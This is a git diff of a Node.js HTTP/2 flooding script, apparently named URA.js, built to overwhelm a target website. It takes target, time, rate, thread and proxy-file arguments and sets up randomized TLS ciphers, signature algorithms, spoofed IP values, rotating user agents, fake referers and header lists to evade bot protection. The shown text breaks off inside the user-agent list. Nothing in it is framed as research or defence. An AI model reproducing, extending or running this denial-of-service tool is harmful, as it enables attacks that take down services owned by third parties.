@@ -1,688 +1,710 @@
 const net = require("net");
-const axios = require('axios')
-const http2 = require("http2");
-const tls = require("tls");
-const cluster = require("cluster");
-const url = require("url");
-const crypto = require("crypto");
-const fs = require("fs");
-const os = require("os");
-const colors = require("colors");
-const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
-const ciphers = "GREASE:" + [
-    defaultCiphers[2],
-    defaultCiphers[1],
-    defaultCiphers[0],
-    ...defaultCiphers.slice(3)
-].join(":");
-const accept_header = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "application/json, text/plain, */*",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/pdf;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xhtml+xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-apple-plist+xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,image/svg+xml;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/x-www-form-urlencoded;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/javascript;q=0.9",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ecmascript;q=0.9"
-],
+ const http2 = require("http2");
+ const tls = require("tls");
+ const cluster = require("cluster");
+ const url = require("url");
+ const crypto = require("crypto");
+ const fs = require("fs");
+ const axios = require('axios');
+ const cheerio = require('cheerio'); 
+ var colors = require("colors");
 
-  cache_header = [
-    'max-age=0, no-cache, no-store, must-revalidate, proxy-revalidate, s-maxage=0, private',
-    'no-cache, no-store, must-revalidate, max-age=0, private, s-maxage=0',
-    'no-cache, no-store, pre-check=0, post-check=0, must-revalidate, proxy-revalidate, s-maxage=0',
-    'no-cache, no-store, private, max-age=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0',
-    'no-cache, no-store, private, s-maxage=0, max-age=0, must-revalidate, stale-if-error=0',
-    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate',
-    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, stale-while-revalidate=0, stale-if-error=0',
-    'no-cache, no-store, private, max-age=0, s-maxage=0, must-revalidate, proxy-revalidate, pre-check=0, post-check=0',
-    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, proxy-revalidate',
-    'private, no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, immutable',
-    'no-cache, no-store, must-revalidate, max-age=0, private, proxy-revalidate, must-understand',
-    'no-cache, no-store, must-revalidate, max-age=0, s-maxage=0, stale-while-revalidate=0, stale-if-error=0, pre-check=0, post-check=0'
-  ]
-language_header = [
-    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
-    'en-US,en;q=0.5',
-    'en-US,en;q=0.9',
-    'de-CH;q=0.7',
-    'da, en-gb;q=0.8, en;q=0.7',
-    'cs;q=0.5',
-    'nl-NL,nl;q=0.9',
-    'nn-NO,nn;q=0.9',
-    'or-IN,or;q=0.9',
-    'pa-IN,pa;q=0.9',
-    'pl-PL,pl;q=0.9',
-    'pt-BR,pt;q=0.9',
-    'pt-PT,pt;q=0.9',
-    'ro-RO,ro;q=0.9',
-    'ru-RU,ru;q=0.9',
-    'si-LK,si;q=0.9',
-    'sk-SK,sk;q=0.9',
-    'sl-SI,sl;q=0.9',
-    'sq-AL,sq;q=0.9',
-    'sr-Cyrl-RS,sr;q=0.9',
-    'sr-Latn-RS,sr;q=0.9',
-    'sv-SE,sv;q=0.9',
-    'sw-KE,sw;q=0.9',
-    'ta-IN,ta;q=0.9',
-    'te-IN,te;q=0.9',
-    'th-TH,th;q=0.9',
-    'tr-TR,tr;q=0.9',
-    'uk-UA,uk;q=0.9',
-    'ur-PK,ur;q=0.9',
-    'uz-Latn-UZ,uz;q=0.9',
-    'vi-VN,vi;q=0.9',
-    'zh-CN,zh;q=0.9',
-    'zh-HK,zh;q=0.9',
-    'zh-TW,zh;q=0.9',
-    'am-ET,am;q=0.8',
-    'as-IN,as;q=0.8',
-    'az-Cyrl-AZ,az;q=0.8',
-    'bn-BD,bn;q=0.8',
-    'bs-Cyrl-BA,bs;q=0.8',
-    'bs-Latn-BA,bs;q=0.8',
-    'dz-BT,dz;q=0.8',
-    'fil-PH,fil;q=0.8',
-    'fr-CA,fr;q=0.8',
-    'fr-CH,fr;q=0.8',
-    'fr-BE,fr;q=0.8',
-    'fr-LU,fr;q=0.8',
-    'gsw-CH,gsw;q=0.8',
-    'ha-Latn-NG,ha;q=0.8',
-    'hr-BA,hr;q=0.8',
-    'ig-NG,ig;q=0.8',
-    'ii-CN,ii;q=0.8',
-    'is-IS,is;q=0.8',
-    'jv-Latn-ID,jv;q=0.8',
-    'ka-GE,ka;q=0.8',
-    'kkj-CM,kkj;q=0.8',
-    'kl-GL,kl;q=0.8',
-    'km-KH,km;q=0.8',
-    'kok-IN,kok;q=0.8',
-    'ks-Arab-IN,ks;q=0.8',
-    'lb-LU,lb;q=0.8',
-    'ln-CG,ln;q=0.8',
-    'mn-Mong-CN,mn;q=0.8',
-    'mr-MN,mr;q=0.8',
-    'ms-BN,ms;q=0.8',
-    'mt-MT,mt;q=0.8',
-    'mua-CM,mua;q=0.8',
-    'nds-DE,nds;q=0.8',
-    'ne-IN,ne;q=0.8',
-    'nso-ZA,nso;q=0.8',
-    'oc-FR,oc;q=0.8',
-    'pa-Arab-PK,pa;q=0.8',
-    'ps-AF,ps;q=0.8',
-    'quz-BO,quz;q=0.8',
-    'quz-EC,quz;q=0.8',
-    'quz-PE,quz;q=0.8',
-    'rm-CH,rm;q=0.8',
-    'rw-RW,rw;q=0.8',
-    'sd-Arab-PK,sd;q=0.8',
-    'se-NO,se;q=0.8',
-    'si-LK,si;q=0.8',
-    'smn-FI,smn;q=0.8',
-    'sms-FI,sms;q=0.8',
-    'syr-SY,syr;q=0.8',
-    'tg-Cyrl-TJ,tg;q=0.8',
-    'ti-ER,ti;q=0.8',
-    'tk-TM,tk;q=0.8',
-    'tn-ZA,tn;q=0.8',
-    'ug-CN,ug;q=0.8',
-    'uz-Cyrl-UZ,uz;q=0.8',
-    've-ZA,ve;q=0.8',
-    'wo-SN,wo;q=0.8',
-    'xh-ZA,xh;q=0.8',
-    'yo-NG,yo;q=0.8',
-    'zgh-MA,zgh;q=0.8',
-    'zu-ZA,zu;q=0.8',
-  ];
-  const fetch_site = [
-    "same-origin"
-    , "same-site"
-    , "cross-site"
-    , "none"
-  ];
-  const fetch_mode = [
-    "navigate"
-    , "same-origin"
-    , "no-cors"
-    , "cors"
-  , ];
-  const fetch_dest = [
-    "document"
-    , "sharedworker"
-    , "subresource"
-    , "unknown"
-    , "worker", ];
-    const cplist = [
-  "TLS_AES_128_CCM_8_SHA256",
-  "TLS_AES_128_CCM_SHA256",
-  "TLS_CHACHA20_POLY1305_SHA256",
-  "TLS_AES_256_GCM_SHA384",
-  "TLS_AES_128_GCM_SHA256"
- ];
- var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
-  process.setMaxListeners(0);
+ process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
- const sigalgs = [
-     "ecdsa_secp256r1_sha256",
-          "rsa_pss_rsae_sha256",
-          "rsa_pkcs1_sha256",
-          "ecdsa_secp384r1_sha384",
-          "rsa_pss_rsae_sha384",
-          "rsa_pkcs1_sha384",
-          "rsa_pss_rsae_sha512",
-          "rsa_pkcs1_sha512"
-]
-  let SignalsList = sigalgs.join(':')
-const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
-const secureOptions =
- crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1 |
- crypto.constants.SSL_OP_NO_TLSv1_3 |
- crypto.constants.ALPN_ENABLED |
- crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
- crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
- crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
- crypto.constants.SSL_OP_COOKIE_EXCHANGE |
- crypto.constants.SSL_OP_PKCS1_CHECK_1 |
- crypto.constants.SSL_OP_PKCS1_CHECK_2 |
- crypto.constants.SSL_OP_SINGLE_DH_USE |
- crypto.constants.SSL_OP_SINGLE_ECDH_USE |
- crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
- const gradient = require('gradient-string');
+ process.on('uncaughtException', function (exception) {
+  });
 
- if (process.argv.length < 7) {
-     console.log(gradient.vice('Usage: host time req thread live.txt'));
-     process.exit();
- }
- const secureProtocol = "TLS_method";
+ if (process.argv.length < 7){console.log('node URA.js [Target] [Time] [Rate] [Thread [Proxy File].'.rainbow);; process.exit();}
  const headers = {};
-
- const secureContextOptions = {
-     ciphers: ciphers,
-     sigalgs: SignalsList,
-     honorCipherOrder: true,
-     secureOptions: secureOptions,
-     secureProtocol: secureProtocol
+  function readLines(filePath) {
+     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
+ }
+ 
+ function randomIntn(min, max) {
+     return Math.floor(Math.random() * (max - min) + min);
+ }
+ 
+ function randomElement(elements) {
+     return elements[randomIntn(0, elements.length)];
+ } 
+ 
+ function randstr(length) {
+   const characters =
+     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+   let result = "";
+   const charactersLength = characters.length;
+   for (let i = 0; i < length; i++) {
+     result += characters.charAt(Math.floor(Math.random() * charactersLength));
+   }
+   return result;
+ }
+ 
+ const ip_spoof = () => {
+   const getRandomByte = () => {
+     return Math.floor(Math.random() * 255);
+   };
+   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
  };
-
- const secureContext = tls.createSecureContext(secureContextOptions);
+ 
+ const spoofed = ip_spoof();
+ 
  const args = {
      target: process.argv[2],
-     time: ~~process.argv[3],
-     Rate: ~~process.argv[4],
-     threads: ~~process.argv[5],
+     time: parseInt(process.argv[3]),
+     Rate: parseInt(process.argv[4]),
+     threads: parseInt(process.argv[5]),
      proxyFile: process.argv[6]
  }
+ const sig = [    
+    'ecdsa_secp256r1_sha256',
+    'ecdsa_secp384r1_sha384',
+    'ecdsa_secp521r1_sha512',
+    'rsa_pss_rsae_sha256',
+    'rsa_pss_rsae_sha384',
+    'rsa_pss_rsae_sha512',
+    'rsa_pkcs1_sha256',
+    'rsa_pkcs1_sha384',
+    'rsa_pkcs1_sha512'
+ ];
+ const sigalgs1 = sig.join(':');
+ const cplist = [
+    "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
+    "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
+ ];
+ const accept_header = [
+     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
+     "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+ ]; 
+ const lang_header = ["en-US,en;q=0.9"];
+ 
+ const encoding_header = ["gzip, deflate, br"];
+ 
+ const control_header = ["no-cache", "max-age=0"];
+ 
+ const refers = [
+     "https://www.google.com/",
+     "https://www.facebook.com/",
+     "https://www.twitter.com/",
+     "https://www.youtube.com/",
+     "https://www.linkedin.com/"
+ ];
+ const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+ const ciphers1 = "GREASE:" + [
+     defaultCiphers[2],
+     defaultCiphers[1],
+     defaultCiphers[0],
+     ...defaultCiphers.slice(3)
+ ].join(":");
+ 
+ const uap = [
+    "LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
+    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5X Build/MDB08L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",
+    "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.31 (KHTML like Gecko) Chrome/26.0.1410.63 Safari/537.31",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
+    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
+    "Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1 Iceweasel/14.0.1",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.166 Safari/537.36 OPR/20.0.1396.73172",
+    "Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
+    "Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0",
+    "Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2)",
+    "Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
+    "Opera/9.20 (Macintosh; Intel Mac OS X; U; en)",
+    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
+    "Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
+    "Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
+    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1",
+    "MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
+    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
+    "Baiduspider ( http://www.baidu.com/search/spider.htm)",
+    "Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
+    "W3C_Validator/1.305.2.12 libwww-perl/5.64",
+    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
+    "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/536.26.17 (KHTML like Gecko) Version/6.0.2 Safari/536.26.17",
+    "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch)",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36",
+    "SuperBot/4.4.0.60 (Windows XP)",
+    "Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
+    "Mozilla/5.0 (Linux; Android 7.0; Nexus 9 Build/NRD90R) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Safari/537.36",
+    "Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
+    "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/BuildID) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
+    "Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20",
+    "Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0",
+    "Uzbl (Webkit 1.3) (Linux i686 [i686])",
+    "Mozilla/5.0 (OS/2; U; OS/2; en-US) AppleWebKit/533.3 (KHTML, like Gecko) QupZilla/1.3.1 Safari/533.3",
+    "EmailWolf 1.00",
+    "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
+    "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36 Vivaldi/1.0.344.37",
+    "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
+    "Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/33.0.1750.152 Chrome/33.0.1750.152 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20120422 Firefox/12.0 SeaMonkey/2.9",
+    "HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
+    "Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
+    "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
+    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
+    "Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
+    "WebZIP/3.5 (http://www.spidersoft.com)",
+    "Mozilla/4.8 [en] (Windows NT 5.1; U)",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
+    "Mozilla/5.0 (Android; Mobile; rv:35.0) Gecko/35.0 Firefox/35.0",
+    "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
+    "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20120724 Debian Iceweasel/15.02",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
+    "Opera/9.80 (Android; Opera Mini/7.5.33361/31.1543; U; en) Presto/2.8.119 Version/11.1010",
+    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
+    "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
+    "Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310b) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36",
+    "portalmmm/2.0 N410i(c20;TB)",
+    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
+    "Download Demon/3.5.0.11",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
+    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
+    "Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
+    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
+    "LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
+    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
+    "Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
+    "Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT",
+    "Mozilla/5.0 (iPad; U; CPU iPad OS 5_0_1 like Mac OS X; en-us) AppleWebKit/535.1+ (KHTML like Gecko) Version/7.2.0.0 Safari/6533.18.5",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.31 (KHTML like Gecko) Chrome/26.0.1410.63 Safari/537.31",
+    "Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; da-dk) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3",
+    "CSSCheck/1.2.2",
+    "Mozilla/5.0 (Linux; webOS/2.2.4; U; en-US) AppleWebKit/534.6 (KHTML, like Gecko) webOSBrowser/221.56 Safari/534.6 Pre/3.0",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11) Sprint:PPC6800",
+    "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
